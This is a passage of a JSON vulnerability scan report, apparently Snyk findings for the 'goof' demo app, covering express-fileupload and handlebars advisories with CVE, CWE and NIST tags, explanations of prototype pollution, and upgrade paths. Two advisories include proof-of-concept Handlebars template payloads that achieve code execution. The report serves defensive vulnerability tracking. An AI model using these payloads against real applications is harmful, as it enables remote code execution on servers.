\"2020-07-30T15:28:18Z\",\n  \"references\": [\n    {\n      \"title\": \"GitHub Issue\",\n      \"url\": \"https://github.com/richardgirges/express-fileupload/issues/236\"\n    },\n    {\n      \"title\": \"GitHub PR\",\n      \"url\": \"https://github.com/richardgirges/express-fileupload/commit/9fca550f08a9dc07cc3500921f4fa7879cf88b8f\"\n    },\n    {\n      \"title\": \"POSIX Vulnerability Blog\",\n      \"url\": \"https://blog.p6.is/Real-World-JS-1/\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \"<1.1.10\"\n    ]\n  },\n  \"severity\": \"high\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Prototype Pollution\",\n  \"severityWithCritical\": \"high\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"express-fileupload@0.0.5\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"express-fileupload@1.1.10\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": false,\n  \"name\": \"express-fileupload\",\n  \"version\": \"0.0.5\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , express-fileupload@0.0.5 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-001310"
            ],
            "nist": [
              "SI-10"
            ],
            "cweid": [
              "94"
            ],
            "cveid": [
              "2021-23369"
            ],
            "ghsaid": [
              "f2jv-r9rf-7988"
            ]
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Remote Code Execution (RCE)",
          "id": "SNYK-JS-HANDLEBARS-1056767",
          "desc": "## Overview\n[handlebars](https://www.npmjs.com/package/handlebars) is an extension to the Mustache templating language.\n\nAffected versions of this package are vulnerable to Remote Code Execution (RCE) when selecting certain compiling options to compile templates coming from an untrusted source.\r\n\r\n### POC\r\n```\r\n<script src=\"https://cdn.jsdelivr.net/npm/handlebars@latest/dist/handlebars.js\"></script> \r\n<script> \r\n// compile the template \r\nvar s = ` \r\n{{#with (__lookupGetter__ \"__proto__\")}} \r\n{{#with (./constructor.getOwnPropertyDescriptor . \"valueOf\")}} \r\n{{#with ../constructor.prototype}} \r\n{{../../constructor.defineProperty . \"hasOwnProperty\" ..}} \r\n{{/with}} \r\n{{/with}} \r\n{{/with}} \r\n{{#with \"constructor\"}} \r\n{{#with split}} \r\n{{pop (push \"alert('Vulnerable Handlebars JS when compiling in strict mode');\")}} \r\n{{#with .}} \r\n{{#with (concat (lookup join (slice 0 1)))}} \r\n{{#each (slice 2 3)}} \r\n{{#with (apply 0 ../..)}} \r\n{{.}} \r\n{{/with}} \r\n{{/each}} \r\n{{/with}} \r\n{{/with}} \r\n{{/with}} \r\n{{/with}} \r\n`;\r\nvar template = Handlebars.compile(s, { \r\nstrict: true \r\n}); \r\n// execute the compiled template and print the output to the console console.log(template({})); \r\n</script>\r\n```\n## Remediation\nUpgrade `handlebars` to version 4.7.7 or higher.\n## References\n- [GitHub Commit](https://github.com/handlebars-lang/handlebars.js/commit/b6d3de7123eebba603e321f04afdbae608e8fea8)\n",
          "impact": 0.7,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:H/E:P/RL:O/RC:C\",\n  \"alternativeIds\": [],\n  \"creationTime\": \"2021-01-08T17:25:21.189033Z\",\n  \"credit\": [\n    \"Francois Lajeunesse-Robert\"\n  ],\n  \"cvssScore\": 7,\n  \"description\": \"## Overview\\n[handlebars](https://www.npmjs.com/package/handlebars) is an extension to the Mustache templating language.\\n\\nAffected versions of this package are vulnerable to Remote Code Execution (RCE) when selecting certain compiling options to compile templates coming from an untrusted source.\\r\\n\\r\\n### POC\\r\\n```\\r\\n<script src=\\\"https://cdn.jsdelivr.net/npm/handlebars@latest/dist/handlebars.js\\\"></script> \\r\\n<script> \\r\\n// compile the template \\r\\nvar s = ` \\r\\n{{#with (__lookupGetter__ \\\"__proto__\\\")}} \\r\\n{{#with (./constructor.getOwnPropertyDescriptor . \\\"valueOf\\\")}} \\r\\n{{#with ../constructor.prototype}} \\r\\n{{../../constructor.defineProperty . \\\"hasOwnProperty\\\" ..}} \\r\\n{{/with}} \\r\\n{{/with}} \\r\\n{{/with}} \\r\\n{{#with \\\"constructor\\\"}} \\r\\n{{#with split}} \\r\\n{{pop (push \\\"alert('Vulnerable Handlebars JS when compiling in strict mode');\\\")}} \\r\\n{{#with .}} \\r\\n{{#with (concat (lookup join (slice 0 1)))}} \\r\\n{{#each (slice 2 3)}} \\r\\n{{#with (apply 0 ../..)}} \\r\\n{{.}} \\r\\n{{/with}} \\r\\n{{/each}} \\r\\n{{/with}} \\r\\n{{/with}} \\r\\n{{/with}} \\r\\n{{/with}} \\r\\n`;\\r\\nvar template = Handlebars.compile(s, { \\r\\nstrict: true \\r\\n}); \\r\\n// execute the compiled template and print the output to the console console.log(template({})); \\r\\n</script>\\r\\n```\\n## Remediation\\nUpgrade `handlebars` to version 4.7.7 or higher.\\n## References\\n- [GitHub Commit](https://github.com/handlebars-lang/handlebars.js/commit/b6d3de7123eebba603e321f04afdbae608e8fea8)\\n\",\n  \"disclosureTime\": \"2021-01-08T17:08:45Z\",\n  \"exploit\": \"Proof of Concept\",\n  \"fixedIn\": [\n    \"4.7.7\"\n  ],\n  \"functions\": [],\n  \"functions_new\": [],\n  \"id\": \"SNYK-JS-HANDLEBARS-1056767\",\n  \"identifiers\": {\n    \"CVE\": [\n      \"CVE-2021-23369\"\n    ],\n    \"CWE\": [\n      \"CWE-94\"\n    ],\n    \"GHSA\": [\n      \"GHSA-f2jv-r9rf-7988\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2021-11-11T10:55:55.623956Z\",\n  \"moduleName\": \"handlebars\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"handlebars\",\n  \"patches\": [],\n  \"proprietary\": true,\n  \"publicationTime\": \"2021-02-15T11:50:51Z\",\n  \"references\": [\n    {\n      \"title\": \"GitHub Commit\",\n      \"url\": \"https://github.com/handlebars-lang/handlebars.js/commit/b6d3de7123eebba603e321f04afdbae608e8fea8\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \"<4.7.7\"\n    ]\n  },\n  \"severity\": \"high\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Remote Code Execution (RCE)\",\n  \"severityWithCritical\": \"high\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"hbs@4.0.4\",\n    \"handlebars@4.0.14\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"hbs@4.1.2\",\n    \"handlebars@4.7.7\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": false,\n  \"name\": \"handlebars\",\n  \"version\": \"4.0.14\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , hbs@4.0.4 , handlebars@4.0.14 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , istanbul-reports@1.4.0 , handlebars@4.0.11 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-003173",
              "CCI-001643"
            ],
            "nist": [
              "SA-11",
              "RA-5"
            ],
            "cweid": [
              "1321"
            ],
            "cveid": [
              "2021-23383"
            ],
            "ghsaid": []
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Prototype Pollution",
          "id": "SNYK-JS-HANDLEBARS-1279029",
          "desc": "## Overview\n[handlebars](https://www.npmjs.com/package/handlebars) is an extension to the Mustache templating language.\n\nAffected versions of this package are vulnerable to Prototype Pollution when selecting certain compiling options to compile templates coming from an untrusted source.\r\n\r\n### POC\r\n```\r\n<script src=\"https://cdn.jsdelivr.net/npm/handlebars@latest/dist/handlebars.js\"></script> \r\n<script> \r\n// compile the template \r\n\r\nvar s2 = `{{'a/.\") || alert(\"Vulnerable Handlebars JS when compiling in compat mode'}}`; \r\nvar template = Handlebars.compile(s2, { \r\ncompat: true \r\n}); \r\n// execute the compiled template and print the output to the console console.log(template({})); \r\n</script>\r\n```\n\n## Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `_proto_`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n### Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `_proto_` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n### Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `_proto_.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n## Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n## Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n    \n\n## How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n### For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\nUpgrade `handlebars` to version 4.7.7 or higher.\n## References\n- [GitHub Commit](https://github.com/handlebars-lang/handlebars.js/commit/f0589701698268578199be25285b2ebea1c1e427)\n",
          "impact": 0.5,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L/E:P/RL:O/RC:C\",\n  \"alternativeIds\": [],\n  \"creationTime\": \"2021-05-04T08:31:48.515713Z\",\n  \"credit\": [\n    \"Francois Lajeunesse-Robert\"\n  ],\n  \"cvssScore\": 5.6,\n  \"description\": \"## Overview\\n[handlebars](https://www.npmjs.com/package/handlebars) is an extension to the Mustache templating language.\\n\\nAffected versions of this package are vulnerable to Prototype Pollution when selecting certain compiling options to compile templates coming from an untrusted source.\\r\\n\\r\\n### POC\\r\\n```\\r\\n<script src=\\\"https://cdn.jsdelivr.net/npm/handlebars@latest/dist/handlebars.js\\\"></script> \\r\\n<script> \\r\\n// compile the template \\r\\n\\r\\nvar s2 = `{{'a/.\\\") || alert(\\\"Vulnerable Handlebars JS when compiling in compat mode'}}`; \\r\\nvar template = Handlebars.compile(s2, { \\r\\ncompat: true \\r\\n}); \\r\\n// execute the compiled template and print the output to the console console.log(template({})); \\r\\n</script>\\r\\n```\\n\\n## Details\\n\\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `_proto_`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\\n\\nThere are two main ways in which the pollution of prototypes occurs:\\n\\n-   Unsafe `Object` recursive merge\\n    \\n-   Property definition by path\\n    \\n\\n### Unsafe Object recursive merge\\n\\nThe logic of a vulnerable recursive merge function follows the following high-level model:\\n```\\nmerge (target, source)\\n\\n  foreach property of source\\n\\n    if property exists and is an object on both the target and the source\\n\\n      merge(target[property], source[property])\\n\\n    else\\n\\n      target[property] = source[property]\\n```\\n<br>  \\n\\nWhen the source object contains a property named `_proto_` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\\n\\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\\n\\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\\n\\n### Property definition by path\\n\\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\\n\\nIf the attacker can control the value of “path”, they can set this value to `_proto_.myValue`. `myValue` is then assigned to the prototype of the class of the object.\\n\\n## Types of attacks\\n\\nThere are a few methods by which Prototype Pollution can be manipulated:\\n\\n| Type |Origin  |Short description |\\n|--|--|--|\\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\\n\\n## Affected environments\\n\\nThe following environments are susceptible to a Prototype Pollution attack:\\n\\n-   Application server\\n    \\n-   Web server\\n    \\n\\n## How to prevent\\n\\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\\n    \\n2.  Require schema validation of JSON input.\\n    \\n3.  Avoid using unsafe recursive merge functions.\\n    \\n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\\n    \\n5.  As a best practice use `Map` instead of `Object`.\\n\\n### For more information on this vulnerability type:\\n\\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\\n\\n## Remediation\\nUpgrade `handlebars` to version 4.7.7 or higher.\\n## References\\n- [GitHub Commit](https://github.com/handlebars-lang/handlebars.js/commit/f0589701698268578199be25285b2ebea1c1e427)\\n\",\n  \"disclosureTime\": \"2021-01-08T08:30:14Z\",\n  \"exploit\": \"Proof of Concept\",\n  \"fixedIn\": [\n    \"4.7.7\"\n  ],\n  \"functions\": [],\n  \"functions_new\": [],\n  \"id\": \"SNYK-JS-HANDLEBARS-1279029\",\n  \"identifiers\": {\n    \"CVE\": [\n      \"CVE-2021-23383\"\n    ],\n    \"CWE\": [\n      \"CWE-1321\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2021-05-04T08:56:24.296344Z\",\n  \"moduleName\": \"handlebars\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"handlebars\",\n  \"patches\": [],\n  \"proprietary\": true,\n  \"publicationTime\": \"2021-05-04T08:56:24.293243Z\",\n  \"references\": [\n    {\n      \"title\": \"GitHub Commit\",\n      \"url\": \"https://github.com/handlebars-lang/handlebars.js/commit/f0589701698268578199be25285b2ebea1c1e427\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \"<4.7.7\"\n    ]\n  },\n  \"severity\": \"medium\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Prototype Pollution\",\n  \"severityWithCritical\": \"medium\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"hbs@4.0.4\",\n    \"handlebars@4.0.14\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"hbs@4.1.2\",\n    \"handlebars@4.7.7\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": false,\n  \"name\": \"handlebars\",\n  \"version\": \"4.0.14\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , hbs@4.0.4 , handlebars@4.0.14 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , istanbul-reports@1.4.0 , handlebars@4.0.11 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-000213"
            ],
            "nist": [
              "AC-3"
            ],
            "cweid": [
              "471"
            ],
            "cveid": [
              "2019-19919"
            ],
            "ghsaid": [
              "w457-6q6x-cgp9"
            ]
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Prototype Pollution",
          "id": "SNYK-JS-HANDLEBARS-469063",
          "desc": "## Overview\n\n[handlebars](https://www.npmjs.com/package/handlebars) is a extension to the Mustache templating language.\n\n\nAffected versions of this package are vulnerable to Prototype Pollution.\nTemplates may alter an Object's `__proto__` and `__defineGetter__` properties, which may allow an attacker to execute arbitrary code on the server through crafted payloads.\n\n## Details\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `_proto_`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\r\n\r\nThere are two main ways in which the pollution of prototypes occurs:\r\n\r\n-   Unsafe `Object` recursive merge\r\n    \r\n-   Property definition by path\r\n    \r\n\r\n### Unsafe Object recursive merge\r\n\r\nThe logic of a vulnerable recursive merge function follows the following high-level model:\r\n```\r\nmerge (target, source)\r\n\r\n  foreach property of source\r\n\r\n    if property exists and is an object on both the target and the source\r\n\r\n      merge(target[property], source[property])\r\n\r\n    else\r\n\r\n      target[property] = source[property]\r\n```\r\n<br>  \r\n\r\nWhen the source object contains a property named `_proto_` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\r\n\r\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\r\n\r\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\r\n\r\n### Property definition by path\r\n\r\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\r\n\r\nIf the attacker can control the value of “path”, they can set this value to `_proto_.myValue`. `myValue` is then assigned to the prototype of the class of the object.\r\n\r\n## Types of attacks\r\n\r\nThere are a few methods by which Prototype Pollution can be manipulated:\r\n\r\n| Type |Origin  |Short description |\r\n|--|--|--|\r\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\r\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\r\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\r\n\r\n## Affected environments\r\n\r\nThe following environments are susceptible to a Prototype Pollution attack:\r\n\r\n-   Application server\r\n    \r\n-   Web server\r\n    \r\n\r\n## How to prevent\r\n\r\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\r\n    \r\n2.  Require schema validation of JSON input.\r\n    \r\n3.  Avoid using unsafe recursive merge functions.\r\n    \r\n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\r\n    \r\n5.  As a best practice use `Map` instead of `Object`.\r\n\r\n### For more information on this vulnerability type:\r\n\r\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\n\nUpgrade `handlebars` to version 4.3.0, 3.8.0 or higher.\n\n\n## References\n\n- [GitHub Commit](https://github.com/wycats/handlebars.js/commit/213c0bbe3c4bd83a534d67384e5afa0000347ff6)\n\n- [GitHub Commit](https://github.com/wycats/handlebars.js/commit/7b67a29a8c926b38af265c727ff6551fbb277111)\n\n- [GitHub Issue](https://github.com/wycats/handlebars.js/issues/1558)\n\n- [Reference](https://www.npmjs.com/advisories/1164)\n\n- [Release Notes](https://github.com/wycats/handlebars.js/blob/master/release-notes.md#v430---september-24th-2019)\n",
          "impact": 0.7,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L\",\n  \"alternativeIds\": [],\n  \"creationTime\": \"2019-09-25T13:12:40.749568Z\",\n  \"credit\": [\n    \"itszn\"\n  ],\n  \"cvssScore\": 7.3,\n  \"description\": \"## Overview\\n\\n[handlebars](https://www.npmjs.com/package/handlebars) is a extension to the Mustache templating language.\\n\\n\\nAffected versions of this package are vulnerable to Prototype Pollution.\\nTemplates may alter an Object's `__proto__` and `__defineGetter__` properties, which may allow an attacker to execute arbitrary code on the server through crafted payloads.\\n\\n## Details\\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `_proto_`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\\r\\n\\r\\nThere are two main ways in which the pollution of prototypes occurs:\\r\\n\\r\\n-   Unsafe `Object` recursive merge\\r\\n    \\r\\n-   Property definition by path\\r\\n    \\r\\n\\r\\n### Unsafe Object recursive merge\\r\\n\\r\\nThe logic of a vulnerable recursive merge function follows the following high-level model:\\r\\n```\\r\\nmerge (target, source)\\r\\n\\r\\n  foreach property of source\\r\\n\\r\\n    if property exists and is an object on both the target and the source\\r\\n\\r\\n      merge(target[property], source[property])\\r\\n\\r\\n    else\\r\\n\\r\\n      target[property] = source[property]\\r\\n```\\r\\n<br>  \\r\\n\\r\\nWhen the source object contains a property named `_proto_` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\\r\\n\\r\\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\\r\\n\\r\\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\\r\\n\\r\\n### Property definition by path\\r\\n\\r\\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\\r\\n\\r\\nIf the attacker can control the value of “path”, they can set this value to `_proto_.myValue`. `myValue` is then assigned to the prototype of the class of the object.\\r\\n\\r\\n## Types of attacks\\r\\n\\r\\nThere are a few methods by which Prototype Pollution can be manipulated:\\r\\n\\r\\n| Type |Origin  |Short description |\\r\\n|--|--|--|\\r\\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\\r\\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\\r\\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\\r\\n\\r\\n## Affected environments\\r\\n\\r\\nThe following environments are susceptible to a Prototype Pollution attack:\\r\\n\\r\\n-   Application server\\r\\n    \\r\\n-   Web server\\r\\n    \\r\\n\\r\\n## How to prevent\\r\\n\\r\\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\\r\\n    \\r\\n2.  Require schema validation of JSON input.\\r\\n    \\r\\n3.  Avoid using unsafe recursive merge functions.\\r\\n    \\r\\n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\\r\\n    \\r\\n5.  As a best practice use `Map` instead of `Object`.\\r\\n\\r\\n### For more information on this vulnerability type:\\r\\n\\r\\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\\n\\n## Remediation\\n\\nUpgrade `handlebars` to version 4.3.0, 3.8.0 or higher.\\n\\n\\n## References\\n\\n- [GitHub Commit](https://github.com/wycats/handlebars.js/commit/213c0bbe3c4bd83a534d67384e5afa0000347ff6)\\n\\n- [GitHub Commit](https://github.com/wycats/handlebars.js/commit/7b67a29a8c926b38af265c727ff6551fbb277111)\\n\\n- [GitHub Issue](https://github.com/wycats/handlebars.js/issues/1558)\\n\\n- [Reference](https://www.npmjs.com/advisories/1164)\\n\\n- [Release Notes](https://github.com/wycats/handlebars.js/blob/master/release-notes.md#v430---september-24th-2019)\\n\",\n  \"disclosureTime\": \"2019-09-24T15:14:43Z\",\n  \"exploit\": \"Not Defined\",\n  \"fixedIn\": [\n    \"4.3.0\",\n    \"3.8.0\"\n  ],\n  \"functions\": [],\n  \"functions_new\": [],\n  \"id\": \"SNYK-JS-HANDLEBARS-469063\",\n  \"identifiers\": {\n    \"CVE\": [\n      \"CVE-2019-19919\"\n    ],\n    \"CWE\": [\n      \"CWE-471\"\n    ],\n    \"GHSA\": [\n      \"GHSA-w457-6q6x-cgp9\"\n    ],\n    \"NSP\": [\n      \"1164\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2020-12-22T17:02:13.549312Z\",\n  \"moduleName\": \"handlebars\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"handlebars\",\n  \"patches\": [],\n  \"proprietary\": false,\n  \"publicationTime\": \"2019-09-25T14:33:59Z\",\n  \"references\": [\n    {\n      \"title\": \"GitHub Commit\",\n      \"url\": \"https://github.com/wycats/handlebars.js/commit/213c0bbe3c4bd83a534d67384e5afa0000347ff6\"\n    },\n    {\n      \"title\": \"GitHub Commit\",\n      \"url\": 